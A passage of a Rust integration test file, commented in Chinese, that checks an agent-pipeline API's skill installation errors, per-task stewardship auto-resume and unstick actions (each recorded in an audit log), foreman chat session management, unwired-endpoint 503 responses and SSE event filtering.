    assert!(
        body["note"].as_str().unwrap().contains("未重新下载"),
        "{body}"
    );
    assert_eq!(body["stage_config"]["skills_json"][0]["name"], "grilling");
    assert_eq!(body["stage_config"]["skills_json"][0]["mode"], "name");
    assert_eq!(body["stage_config"]["skills_json"][0]["trusted"], false);
}

/// 失败可归因：索引里没有这个技能 → 404，且**不写配置**。
#[tokio::test]
async fn one_click_install_reports_a_missing_skill_and_leaves_config_alone() {
    let api = api().await;

    let (status, body) = post(
        &api,
        "/skills/install",
        serde_json::json!({"stage": "architect-design", "name": "no-such-skill"}),
    )
    .await;
    assert_eq!(status, StatusCode::NOT_FOUND, "{body}");
    // 与「这个仓里没有那个目录」同一类：用户动作同为**换技能**（决策 194 裁决⑦ / 票 02）
    assert_eq!(body["kind"], "skill_not_found", "{body}");
    assert!(
        api.state
            .store
            .get_stage_config("architect-design")
            .await
            .unwrap()
            .is_none(),
        "装不上就不该留下半条配置"
    );
}

/// 未配置市场来源 → 400 且报文说清怎么开（不是 500，也不是静默成功）。
#[tokio::test]
async fn one_click_install_without_market_sources_is_actionable() {
    let api = api().await;
    let (status, body) = post(
        &api,
        "/skills/install",
        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("仓名单"),
        "报文要说清去界面把仓加进名单：{body}"
    );
}

/// 阶段键非法 → 400（伪阶段不跑 agent 节点，不该被一键安装写进去）。
#[tokio::test]
async fn one_click_install_rejects_unknown_stages() {
    let api = api().await;
    let (status, body) = post(
        &api,
        "/skills/install",
        serde_json::json!({"stage": "conflict_check", "name": "grilling"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(body["error"].as_str().unwrap().contains("阶段"), "{body}");
}

/// 停用推荐 = 从配置行移除（走既有 DELETE / PUT，不需要第二条路径）。
#[tokio::test]
async fn disabling_a_recommended_skill_removes_it_from_the_stage_config() {
    let api = api().await;
    seed_installed_skill(&api, "grilling", "拷问协议正文。").await;
    let (status, _) = post(
        &api,
        "/skills/install",
        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK);

    // 「停用」= 整条替换成不含该技能（PUT 的既有语义）
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({"provider_id": null}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let stored = api
        .state
        .store
        .get_stage_config("architect-design")
        .await
        .unwrap()
        .unwrap();
    assert!(
        agentpipeline_core::config::declared_skill_decls(&stored).is_empty(),
        "停用后配置行里不应再有该技能"
    );
}

// ─────────────────────────── 对讲台（决策 182，票 01 / 03）───────────────────────────

/// 对讲台 harness：注入 `FakeAgent` + `ForemanRunner`（决策 182：缺省 `None` 时
/// 三个端点返回 503，故契约测试必须显式接线）。
///
/// 与 `api_full` 一样**不建项目、不建任务**——本特性最初的诉求就是
/// 「对话不需要依赖任务」，契约层的锚点因此是**空 home 下三个端点都可用**。
async fn api_with_foreman(agent: FakeAgent) -> Api {
    api_full_with_foreman(
        Settings {
            pending_resume_cooldown_sec: 5,
            ..Default::default()
        },
        Some(agent),
    )
    .await
}

/// 同 `api_with_foreman`，但注入的是**任意** `LlmClient`。
///
/// 并发的取消类用例要在模型那一侧自己掌握节奏（「我说放行才回话」），而 `Script` 的形状
/// 是「按序取一步」——不给它加一个只为测试存在的步骤类型，用在这里的客户端自带。
async fn api_with_llm(llm: Arc<dyn LlmClient>) -> Api {
    api_full_with_foreman_llm(
        Settings {
            pending_resume_cooldown_sec: 5,
            ..Default::default()
        },
        Some(llm),
    )
    .await
}

async fn api_full_with_foreman(settings: Settings, agent: Option<FakeAgent>) -> Api {
    api_full_with_foreman_llm(settings, agent.map(|a| Arc::new(a) as Arc<dyn LlmClient>)).await
}

async fn api_full_with_foreman_llm(settings: Settings, llm: Option<Arc<dyn LlmClient>>) -> Api {
    let home = TestHome::new().unwrap();
    let (store, clock) = home.setup().await.unwrap();
    let repo = Repo::clean().unwrap();
    // 配一个 provider：值班长的 provider 解析要落到一个真实存在的行上
    // （「不配置也能用」指的是**阶段配置**缺行，不是连 provider 都没有）。
    store
        .upsert_provider(&Provider {
            id: "p-default".into(),
            vendor: "deepseek".into(),
            model: "deepseek-chat".into(),
            context_window: 64_000,
            base_url: None,
            api_key: Some("sk-super-secret-value-123456".into()),
            enabled: true,
            created_at: store.now(),
            updated_at: store.now(),
        })
        .await
        .unwrap();

    let resumes = Arc::new(AtomicUsize::new(0));
    let hook_resumes = resumes.clone();
    let state = AppState::new(store, home.home().clone(), settings, PORT).with_resume_hook(
        Arc::new(move |_task_id| {
            hook_resumes.fetch_add(1, Ordering::SeqCst);
        }),
    );
    // 先取好 runner 需要的三个句柄，再消费 `state`——`with_foreman` 会拿走 state，
    // 在它的实参位置里读 `state.home` 是「移动后借用」。
    let state = match llm {
        Some(llm) => {
            // 与生产接线同形（serve.rs）：托管放行的自动动作走 resume 的唯一实现。
            // 测试里少这一句，那条路（票 08 的 `task resume continue`）就只会在生产里跑。
            let runner = Arc::new(
                ForemanRunner::new(
                    state.store.clone(),
                    state.settings.clone(),
                    state.home.clone(),
                    llm,
                    state.sse.clone(),
                )
                .with_steward_actions(Arc::new(app::runtime::StewardActions::new(
                    state.store.clone(),
                    state.settings.clone(),
                    state.resume_hook.clone(),
                    state.sse.clone(),
                ))),
            );
            state.with_foreman(runner)
        }
        None => state,
    };
    let router = build_router(state.clone());
    Api {
        _home: home,
        _repo: repo,
        state,
        router,
        resumes,
        clock,
    }
}

// ─────────────── 任务级托管：端点与自动放行（决策 210② / 票 08）───────────────

#[tokio::test]
async fn stewardship_is_a_task_level_switch_read_back_on_the_task() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    seed(&api, "t1").await;

    // 默认没开：读回来是 null（不是 `enabled: false` —— 那会让「从没开过」与「开过又关了」混起来）
    let (_, body) = get(&api, "/tasks/t1").await;
    assert!(body["task"]["stewardship"].is_null(), "{body}");

    let (status, body) = post(&api, "/tasks/t1/stewardship", json!({"enabled": true})).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["task"]["stewardship"]["enabled"], true);

    // 看板回读：列表里也带得出来
    let (_, list) = get(&api, "/tasks").await;
    assert_eq!(list["tasks"][0]["stewardship"]["enabled"], true, "{list}");

    // 关掉 = 清空那一列
    let (status, _) = post(&api, "/tasks/t1/stewardship", json!({"enabled": false})).await;
    assert_eq!(status, StatusCode::OK);
    let (_, body) = get(&api, "/tasks/t1").await;
    assert!(body["task"]["stewardship"].is_null(), "{body}");
}

#[tokio::test]
async fn stewardship_is_refused_on_a_terminal_task_and_when_unwired() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    seed(&api, "t1").await;
    api.state
        .store
        .mark_terminal("t1", TaskStatus::Done)
        .await
        .unwrap();
    let (status, body) = post(&api, "/tasks/t1/stewardship", json!({"enabled": true})).await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(body["error"].as_str().unwrap().contains("终态"), "{body}");

    // 没接线时这个开关没人用得上：503（与对讲台其余端点同一姿态）
    let unwired = api_for_unwired_probe().await;
    seed(&unwired, "t1").await;
    let (status, body) = post(&unwired, "/tasks/t1/stewardship", json!({"enabled": true})).await;
    assert_eq!(status, StatusCode::SERVICE_UNAVAILABLE, "{body}");
}

#[tokio::test]
async fn a_stewarded_task_is_resumed_by_the_foreman_without_a_press() {
    // 端到端：开托管 → 值班长说 resume(continue) → **真的走了 resume 那条路**（无提议、有账）。
    //
    // 待办形态得挑对：托管放开的**只有** `continue`（决策 210②），而「允许集合里有哪些动作」
    // 是按 pending 的种类下发的——`retry_exhausted` 那一档只有 goto / skip / cancel，
    // 拿它做样本的话 `continue` 会被状态机正当地拒掉，用例永远看不到「放行」那一步。
    // 「裁决分歧」这一档的 continue（裁决合格，继续）是真实存在的合法落点。
    let agent = FakeAgent::new(Script::new());
    let api = api_with_foreman(agent.clone()).await;
    seed(&api, "t1").await;
    let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();
    api.state
        .store
        .set_cursor_pending(
            &cursor.cursor_id,
            &agentpipeline_core::types::PendingReason::new(
                agentpipeline_core::types::PendingKind::UserDecision,
                cursor.stage,
                cursor.node,
                "评审员与架构师对这条裁决有分歧",
            )
            .with_context(agentpipeline_core::types::PendingContext::with_kind(
                agentpipeline_core::actions::kinds::JUDGE_DISAGREEMENT,
            )),
        )
        .await
        .unwrap();
    api.state.store.sync_task_projection("t1").await.unwrap();
    let (status, _) = post(&api, "/tasks/t1/stewardship", json!({"enabled": true})).await;
    assert_eq!(status, StatusCode::OK);

    let mut script = Script::new();
    script.for_foreman().tool(
        "task",
        json!({"action": "resume", "task_id": "t1", "resume_action": "continue"}),
    );
    script.for_foreman().text("已放行。");
    agent.set_script(script);

    let (status, body) = post(&api, "/foreman/messages", json!({"text": "t1 卡住了"})).await;
    assert_eq!(status, StatusCode::OK, "{body}");

    // 提议一条都没有（人没按键），任务真的被放出去了（游标不再 pending）
    let sid = body["session"]["id"].as_str().unwrap().to_string();
    let pending = api
        .state
        .store
        .list_pending_foreman_proposals(&sid)
        .await
        .unwrap();
    assert!(pending.is_empty(), "{pending:?}");
    let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();
    assert!(
        !cursor.is_pending(),
        "托管放行后游标应当被拍过板：{cursor:?}"
    );
    // 留账（硬要求）
    let messages = api
        .state
        .store
        .list_foreman_messages(&sid, 100)
        .await
        .unwrap();
    assert!(
        messages.iter().any(|m| m.content.starts_with("【托管】")),
        "{messages:?}"
    );
    assert_eq!(api.resumes.load(Ordering::SeqCst), 1, "执行器被拉起一次");
}

/// 托管放行的 `unstick` **真的执行得通**（决策 210⑧ / 票 09）。
///
/// 这一条必须打在 app 层。core 那侧的托管用例注入的是替身执行者——它能数出「有没有被放行」，
/// 但不会真的去解开一个卡死的任务，于是「放行了、却执行不通」这件事在那一边永远看不见。
/// 实际发生过：执行者只建 `ResumeRequest`，被放行的 `unstick` 落到 `ResumeAction::parse("")`
/// 上（`未知 resume 动作：`）——门开了，路不通。
#[tokio::test]
async fn a_stewarded_task_can_be_unstuck_by_the_foreman_without_a_press() {
    let agent = FakeAgent::new(Script::new());
    let api = api_with_foreman(agent.clone()).await;
    seed(&api, "t1").await;
    let store = &api.state.store;
    let cursor = store.load_live_cursors("t1").await.unwrap()[0].clone();
    store
        .set_task_status("t1", TaskStatus::Running)
        .await
        .unwrap();
    assert!(store.try_claim_executor("t1", "owner-1").await.unwrap());
    store
        .insert_run(&agentpipeline_core::storage::observability::NewRun {
            task_id: "t1".into(),
            cursor_id: cursor.cursor_id.clone(),
            stage: cursor.stage,
            node: cursor.node,
            attempt: 1,
            agent_type: "main".into(),
            parent_run_id: None,
            prompt_template_hash: None,
            process_group_id: None,
        })
        .await
        .unwrap();
    // 心跳停在 900s 前（> watch_owner_stuck_minutes = 10）：有主、但主已经不在了
    api.clock.advance_secs(900);

    let (status, _) = post(&api, "/tasks/t1/stewardship", json!({"enabled": true})).await;
    assert_eq!(status, StatusCode::OK);

    let mut script = Script::new();
    script
        .for_foreman()
        .tool("task", json!({"action": "unstick", "task_id": "t1"}));
    script.for_foreman().text("解开了，现在可以 resume。");
    agent.set_script(script);

    let (status, body) = post(&api, "/foreman/messages", json!({"text": "t1 卡住了"})).await;
    assert_eq!(status, StatusCode::OK, "{body}");

    // 没有提议（人没按键），而占用**真的**被摘掉了：owner 清空、游标转 pending、
    // 僵死的 run 标了终态——三件事都是 `unstick` 的实现，不是「放行了一下」。
    let sid = body["session"]["id"].as_str().unwrap().to_string();
    assert!(store
        .list_pending_foreman_proposals(&sid)
        .await
        .unwrap()
        .is_empty());
    let task = store.get_task("t1").await.unwrap();
    assert!(
        task.executor_owner.as_deref().unwrap_or("").is_empty(),
        "执行者占用要清空：{:?}",
        task.executor_owner
    );
    let after = store.load_live_cursors("t1").await.unwrap()[0].clone();
    assert!(
        after.is_pending(),
        "解开之后停在 pending 等人拍板：{after:?}"
    );
    assert_eq!(
        after
            .pending_reason
            .as_ref()
            .and_then(|r| r.context.as_ref())
            .and_then(|c| c.kind.as_deref()),
        Some("unstick"),
        "pending 的原因要指名它是怎么解开的"
    );
    let runs = store.list_runs("t1").await.unwrap();
    assert_eq!(
        runs[0].status,
        agentpipeline_core::types::NodeStatus::Timeout,
        "僵死的 run 要标终态——「它还在跑」这句话得从台账里消失"
    );
    // 留账（硬要求）：那一行说的是**实际做的动作**
    let messages = store.list_foreman_messages(&sid, 100).await.unwrap();
    assert!(
        messages
            .iter()
            .any(|m| m.content.starts_with("【托管】") && m.content.contains("unstick")),
        "{messages:?}"
    );
}

/// 空 home 下读会话：形状完整、合计为 0、不报错。
#[tokio::test]
async fn foreman_session_is_available_on_an_empty_home() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    let (status, body) = get(&api, "/foreman/session").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["messages"].as_array().unwrap().len(), 0);
    assert_eq!(body["total_tokens"], 0);
    assert_eq!(body["total_calls"], 0);
    // 一个班次都没有时是 `null`，不是一个凭空造出来的空班次：读端点不建行
    // （建行是写端点的事），前端据此走空态并提议新开一个。
    assert!(body["session"].is_null());
    // 身份回执：前端据此确认「对面是谁」，也让人一眼看出这一版有没有接线。
    assert_eq!(body["foreman"]["agent_type"], "foreman");
    assert_eq!(body["foreman"]["stage_key"], "foreman");
    assert_eq!(body["foreman"]["wired"].as_bool(), Some(true));
}

/// 空 home 下发一句话、拿到回话——**本 spec 的验收锚点**。
#[tokio::test]
async fn empty_home_can_converse_through_the_api() {
    let mut script = Script::new();
    script
        .for_foreman()
        .text("现在什么都没有在跑。先建一个项目，再建任务。");
    let api = api_with_foreman(FakeAgent::new(script)).await;

    let (status, body) = post(&api, "/foreman/messages", json!({"text": "现在能做什么？"})).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert!(body["reply"].as_str().unwrap().contains("先建一个项目"));
    // 回话行带 id / 时间戳（由落库产生），前端据此做稳定 key。
    assert!(body["message"]["id"].as_i64().unwrap() > 0);
    assert_eq!(body["message"]["role"], "assistant");
    // 空 home 的快照也落库了（审计：它当时看到的是「什么都没有」这份读数）。
    assert!(body["message"]["briefing"].is_object());
    assert_eq!(
        body["message"]["briefing"]["projects"]
            .as_array()
            .unwrap()
            .len(),
        0
    );
    // 会话合计随之上来——对讲台自报「本次会话 N tok」的来源。
    assert!(body["total_tokens"].as_u64().unwrap() > 0);
    assert_eq!(body["total_calls"], 1);

    // 再读一次会话：两句都在，人先说、值班长后答。
    let (status, body) = get(&api, "/foreman/session").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let messages = body["messages"].as_array().unwrap();
    assert_eq!(messages.len(), 2);
    assert_eq!(messages[0]["role"], "user");
    assert_eq!(messages[0]["content"], "现在能做什么？");
    assert_eq!(messages[1]["role"], "assistant");
    assert!(messages[1]["content"]
        .as_str()
        .unwrap()
        .contains("先建一个项目"));
}

/// 客户端在回话途中放弃，**掐不死这一轮**（决策 223）。
///
/// 现场（2026-09-18）：本地等不到回包就放弃，hyper 把 handler 的 future 丢掉，`say()`
/// 连同它的失败外框一起消失——库里只剩一条孤立的 `user` 行，回话与原因都是零。这一轮
/// 现在跑在自己的任务里，故「本地放弃」只等于「这一次没等到回包」。
///
/// 牙齿：把路由里的 `tokio::spawn` 拿掉（回到 handler 与请求同生共死），这个用例会停在
/// 「放行模型之后台账里还是只有 user 行」那一格上。
#[tokio::test]
async fn a_dropped_request_does_not_kill_the_turn() {
    /// 收到信号才回话的模型：把「客户端在回话途中放弃」变成一个可复现的次序——
    /// 断言的是**放弃之后**这一轮的下场，故模型必须停在那一刻等我们动手。
    struct Gated(Arc<tokio::sync::Notify>);
    impl LlmClient for Gated {
        fn complete(
            &self,
            _request: agentpipeline_core::agent::client::LlmRequest,
        ) -> futures::future::BoxFuture<
            'static,
            agentpipeline_core::Result<agentpipeline_core::agent::client::AgentResponse>,
        > {
            let release = self.0.clone();
            Box::pin(async move {
                release.notified().await;
                Ok(agentpipeline_core::agent::client::AgentResponse {
                    content: Some("收到，我盯着 t1。".into()),
                    prompt_tokens: 10,
                    completion_tokens: 5,
                    ..Default::default()
                })
            })
        }
    }

    let release = Arc::new(tokio::sync::Notify::new());
    let api = api_with_llm(Arc::new(Gated(release.clone()))).await;

    // 请求要**真发出去**（`oneshot` 返回的是惰性 future），同时留着掐它的把手：
    // 掐掉这一次请求 ≈ hyper 在客户端断开时把 handler 丢掉。
    let sending = tokio::spawn(
        api.router.clone().oneshot(
            request("POST", "/foreman/messages")
                .header(header::CONTENT_TYPE, "application/json")
                .body(Body::from(json!({"text": "盯着 t1"}).to_string()))
                .unwrap(),
        ),
    );
    // 这一轮真的开始了：`say()` 的第一步就是把用户那一句落库（会话也随之建出来）。
    let mut sid = String::new();
    for _ in 0..300 {
        if let Some(session) = api.state.store.latest_foreman_session().await.unwrap() {
            sid = session.id;
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(10)).await;
    }
    assert!(!sid.is_empty(), "这一轮应当先把用户那一句落库");

    // 客户端放弃这一次请求（关页 / 本地超时 / 换网）：丢掉它的 future。
    sending.abort();
    let _ = sending.await;

    // 放行模型：这一轮仍应当把回话写进台账。
    release.notify_one();
    let mut reply = None;
    for _ in 0..300 {
        let messages = api
            .state
            .store
            .list_foreman_messages(&sid, 100)
            .await
            .unwrap();
        if let Some(assistant) = messages.iter().find(|m| m.role == "assistant") {
            reply = Some(assistant.content.clone());
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(10)).await;
    }
    assert_eq!(
        reply.as_deref(),
        Some("收到，我盯着 t1。"),
        "客户端放弃之后，这一轮的回话仍要落库"
    );
    // 而且它是**成功**的一轮：不应当多出一条失败留痕（那会把「客户端走了」说成「这一轮没跑起来」）。
    let messages = api
        .state
        .store
        .list_foreman_messages(&sid, 100)
        .await
        .unwrap();
    assert!(
        !messages
            .iter()
            .any(|m| m.role == "system" && m.content.starts_with(FOREMAN_FAILED_TURN_MARK)),
        "放弃这一次请求不等于这一轮失败：{messages:?}"
    );
}

/// 班次四件事（决策 204①）：新建 / 切换 / 重命名 / 归档，全走端点。
///
/// 一起测是刻意的——它们是同一条链（新建出来 → 列表里看到 → 改名 → 归档后从列表消失），
/// 拆成四条会漏掉「新建的那条 id 在后三个操作里还认不认」。
#[tokio::test]
async fn foreman_sessions_can_be_created_renamed_and_archived() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;

    // 空 home：列表是空的，不是 404、不是 500。
    let (status, body) = get(&api, "/foreman/sessions").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["sessions"].as_array().unwrap().len(), 0);

    // 新建 → 201 + 中性标题（第一句话说出来时才按它命名，决策 204②）。
    let (status, body) = post(&api, "/foreman/sessions", json!({})).await;
    assert_eq!(status, StatusCode::CREATED, "{body}");
    let first = body["session"]["id"].as_str().unwrap().to_string();
    assert_eq!(body["session"]["title"], "新班次");
    assert!(body["session"]["archived_at"].is_null());

    // 再开一个，列表按最近活动倒序（新的在前）。
    let (_, body) = post(&api, "/foreman/sessions", json!({"title": "第二班"})).await;
    let second = body["session"]["id"].as_str().unwrap().to_string();
    assert_eq!(body["session"]["title"], "第二班");
    let (_, body) = get(&api, "/foreman/sessions").await;
    let ids: Vec<&str> = body["sessions"]
        .as_array()
        .unwrap()
        .iter()
        .map(|s| s["id"].as_str().unwrap())
        .collect();
    assert_eq!(ids, vec![second.as_str(), first.as_str()]);

    // 改名。
    let (status, body) = patch(
        &api,
        &format!("/foreman/sessions/{first}"),
        json!({"title": "昨晚那一班"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["session"]["title"], "昨晚那一班");

    // 切到某个班次去读：`?session=` 认它，且返回的正是它的读数。
    let (status, body) = get(&api, &format!("/foreman/session?session={first}")).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["session"]["id"], first.as_str());
    assert_eq!(body["session"]["title"], "昨晚那一班");

    // 归档 → 从列表里收起来（不物理删除）。
    let (status, body) = post(
        &api,
        &format!("/foreman/sessions/{first}/archive"),
        json!({}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert!(!body["session"]["archived_at"].is_null());
    let (_, body) = get(&api, "/foreman/sessions").await;
    let ids: Vec<&str> = body["sessions"]
        .as_array()
        .unwrap()
        .iter()
        .map(|s| s["id"].as_str().unwrap())
        .collect();
    assert_eq!(ids, vec![second.as_str()], "归档的不在列表里");
    // 按 id 仍取得到它——归档是收起来，不是删掉。
    let (status, _) = get(&api, &format!("/foreman/session?session={first}")).await;
    assert_eq!(status, StatusCode::OK);

    // 不存在的班次：404 且报文说得清是哪个。
    let (status, body) = patch(
        &api,
        "/foreman/sessions/no-such-session",
        json!({"title": "x"}),
    )
    .await;
    assert_eq!(status, StatusCode::NOT_FOUND, "{body}");
    assert!(body["error"].as_str().unwrap().contains("no-such-session"));

    // 空标题与超长标题都是 400（标题是 chip 上看得见的东西，不能是空串）。
    let (status, _) = patch(
        &api,
        &format!("/foreman/sessions/{second}"),
        json!({"title": "   "}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let too_long = "字".repeat(64);
    let (status, _) = patch(
        &api,
        &format!("/foreman/sessions/{second}"),
        json!({"title": too_long}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
}

/// 两个班次各说各的：消息与页头合计都按班次读，互不污染（决策 204②⑤）。
#[tokio::test]
async fn foreman_sessions_isolate_their_own_messages_and_totals() {
    let mut script = Script::new();
    script.for_foreman().text("甲班收到。");
    script.for_foreman().text("乙班收到。");
    let api = api_with_foreman(FakeAgent::new(script)).await;

    let (_, body) = post(&api, "/foreman/sessions", json!({"title": "甲班"})).await;
    let a = body["session"]["id"].as_str().unwrap().to_string();
    let (_, body) = post(&api, "/foreman/sessions", json!({"title": "乙班"})).await;
    let b = body["session"]["id"].as_str().unwrap().to_string();

    let (_, body) = post(
        &api,
        "/foreman/messages",
        json!({"text": "甲班的话", "session_id": a}),
    )
    .await;
    assert_eq!(body["session"]["id"], a.as_str());
    assert!(body["total_tokens"].as_u64().unwrap() > 0);

    let (_, body) = post(
        &api,
        "/foreman/messages",
        json!({"text": "乙班的话", "session_id": b}),
    )
    .await;
    assert_eq!(body["total_calls"], 1, "乙班只说过一轮");

    let (_, in_a) = get(&api, &format!("/foreman/session?session={a}")).await;
    assert_eq!(in_a["messages"].as_array().unwrap().len(), 2);
    assert_eq!(in_a["messages"][0]["content"], "甲班的话");
    let (_, in_b) = get(&api, &format!("/foreman/session?session={b}")).await;
    assert_eq!(in_b["messages"].as_array().unwrap().len(), 2);
    assert_eq!(in_b["messages"][0]["content"], "乙班的话");

    // 合计也各有各的：**一个没说过话的第三个班次读出来是 0**——按会话过滤之前，
    // 这里读到的是「自建库以来的累计值」，这条断言当时必然失败。
    let (_, body) = post(&api, "/foreman/sessions", json!({})).await;
    let c = body["session"]["id"].as_str().unwrap().to_string();
    let (_, in_c) = get(&api, &format!("/foreman/session?session={c}")).await;
    assert_eq!(in_c["total_tokens"], 0);
    assert_eq!(in_c["total_calls"], 0);
    assert!(in_a["total_calls"].as_u64().unwrap() >= 1);

    // 增量事件带会话身份（决策 204⑥）：前端据此把回话归到正确的班次。
    let mut rx = api.state.sse.subscribe();
    api.state.sse.publish(SseEvent::ConversationDelta {
        task_id: String::new(),
        branch: String::new(),
        run_id: 0,
        agent_type: "foreman".into(),
        session_id: a.clone(),
        channel: agentpipeline_core::sse::Channel::Content,
        role: "assistant".into(),
        text: "甲班流式".into(),
        prompt_tokens: 1,
        completion_tokens: 1,
    });
    match rx.recv().await.unwrap() {
        SseEvent::ConversationDelta { session_id, .. } => assert_eq!(session_id, a),
        other => panic!("应是会话增量：{other:?}"),
    }
}

/// 往已归档的班次说话被拒（400）——那种记录谁也看不见。
#[tokio::test]
async fn foreman_refuses_to_speak_into_an_archived_session() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    let (_, body) = post(&api, "/foreman/sessions", json!({})).await;
    let sid = body["session"]["id"].as_str().unwrap().to_string();
    let (status, _) = post(&api, &format!("/foreman/sessions/{sid}/archive"), json!({})).await;
    assert_eq!(status, StatusCode::OK);

    let (status, body) = post(
        &api,
        "/foreman/messages",
        json!({"text": "喂", "session_id": sid}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(body["error"].as_str().unwrap().contains("归档"));
}

/// 未接线时对讲台端点**一律** 503 而不是 500：服务是好的，是这个能力这次没被接上。
///
/// 会话 / 发话 / 订阅这几个入口是同一件事的几面——留下一个「能读历史、发不出话」的页面
/// 比一句「未接线」更难排查（而且读会话虽然只需要库，页面拿到历史后第一件事就是发话）。
/// 清单端点（`/foreman/tools`，决策 247⑤）**也在列**：它虽是静态数据，
/// `/foreman/*` 下没有「接线外可用」的特例——特例就是第二份口径。
#[tokio::test]
async fn foreman_endpoints_report_503_when_unwired() {
    let api = api_full(Settings::default(), Vec::new(), offline_repo(), Vec::new()).await;

    let (status, body) = get(&api, "/foreman/tools").await;
    assert_eq!(status, StatusCode::SERVICE_UNAVAILABLE, "{body}");

    let (status, body) = get(&api, "/foreman/session").await;
    assert_eq!(status, StatusCode::SERVICE_UNAVAILABLE, "{body}");
    assert!(body["error"].as_str().unwrap().contains("未接线"));

    let (status, body) = post(&api, "/foreman/messages", json!({"text": "在吗"})).await;
    assert_eq!(status, StatusCode::SERVICE_UNAVAILABLE, "{body}");
    assert!(body["error"].as_str().unwrap().contains("未接线"));

    let (status, _) = get(&api, "/foreman/stream").await;
    assert_eq!(status, StatusCode::SERVICE_UNAVAILABLE);
    // 未接线时不落任何一行会话——拒绝发生在写之前。
    let store = api.state.store.clone();
    assert!(store.list_foreman_sessions().await.unwrap().is_empty());
    let (status, _) = get(&api, "/foreman/sessions").await;
    assert_eq!(status, StatusCode::SERVICE_UNAVAILABLE);
}

/// 空消息被拒且不入账（400，不是 500）。
#[tokio::test]
async fn foreman_rejects_an_empty_message() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    let (status, body) = post(&api, "/foreman/messages", json!({"text": "   "})).await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    let (_, body) = get(&api, "/foreman/session").await;
    assert_eq!(body["messages"].as_array().unwrap().len(), 0);
    assert!(body["session"].is_null(), "空消息连班次都不该开");
}

/// 流式端点真的把值班长的增量送到订阅者手上（票 03）。
///
/// 与任务级 SSE 的测法不同：工头事件的 `task_id` 是空串，**没有** `/tasks/{id}/stream`
/// 能订阅它，故这里直接订阅 `SseBus`——它同时证明了「复用同一条总线」这个实现选择
/// （决策 182⑥：不新增事件变体，加一条按身份过滤的路由）。
#[tokio::test]
async fn foreman_stream_carries_conversation_deltas_to_subscribers() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    let mut rx = api.state.sse.subscribe();

    // 直接发一条工头增量（生产里由适配器在流式回话时发）。
    api.state.sse.publish(SseEvent::ConversationDelta {
        task_id: String::new(),
        branch: String::new(),
        run_id: 0,
        agent_type: "foreman".into(),
        session_id: "s-1".into(),
        channel: agentpipeline_core::sse::Channel::Content,
        role: "assistant".into(),
        text: "半句话".into(),
        prompt_tokens: 7,
        completion_tokens: 3,
    });
    // 一条任务事件混在同一条总线上——它不该被工头过滤放行。
    api.state.sse.publish(SseEvent::ConversationDelta {
        task_id: "t-other".into(),
        branch: "main".into(),
        run_id: 42,
        agent_type: "main".into(),
        session_id: String::new(),
        channel: agentpipeline_core::sse::Channel::Content,
        role: "assistant".into(),
        text: "流水线的话".into(),
        prompt_tokens: 1,
        completion_tokens: 1,
    });

    let first = rx.recv().await.unwrap();
    assert!(first.is_foreman_event(), "工头增量应被认作工头事件");
    match &first {
        SseEvent::ConversationDelta {
            text,
            task_id,
            agent_type,
            ..
        } => {
            assert_eq!(text, "半句话");
            assert_eq!(task_id, "", "工头事件带空 task id");
            assert_eq!(agent_type, "foreman");
        }
        other => panic!("应是会话增量：{other:?}"),
    }
    let second = rx.recv().await.unwrap();
    assert!(!second.is_foreman_event(), "任务事件不该被工头路由收走");

    // 既有任务级路由对工头事件**零干扰**：空 task id 永不等于真实任务 id。
    assert_ne!(first.task_id(), "t-other");
    assert_eq!(first.task_id(), "");
}

/// 工头事件不会污染某条真实任务的 SSE 流（票 03 的「零干扰」断言）。
#[tokio::test]
async fn task_stream_never_receives_foreman_events() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    let task_id = seed(&api, "t-iso").await;

    // 真实任务流按 task id 精确匹配（routes/tasks.rs::stream）。
    let mut rx = api.state.sse.subscribe();
    api.state.sse.publish(SseEvent::ConversationDelta {
        task_id: String::new(),
        branch: String::new(),
        run_id: 0,
        agent_type: "foreman".into(),
        session_id: "s-1".into(),
        channel: agentpipeline_core::sse::Channel::Content,
        role: "assistant".into(),
        text: "值班长说的话".into(),
        prompt_tokens: 1,
        completion_tokens: 1,
    });
    api.state.sse.publish(SseEvent::ConversationDelta {
        task_id: task_id.clone(),
        branch: "main".into(),
        run_id: 9,
        agent_type: "main".into(),
        session_id: String::new(),
        channel: agentpipeline_core::sse::Channel::Content,
        role: "assistant".into(),
        text: "这条任务自己的话".into(),
        prompt_tokens: 1,
        completion_tokens: 1,
    });

    // 复刻路由的过滤条件，断言工头那条被丢弃。
    let mut delivered: Vec<String> = Vec::new();
    for _ in 0..2 {
        let event = rx.recv().await.unwrap();
        if event.task_id() == task_id {
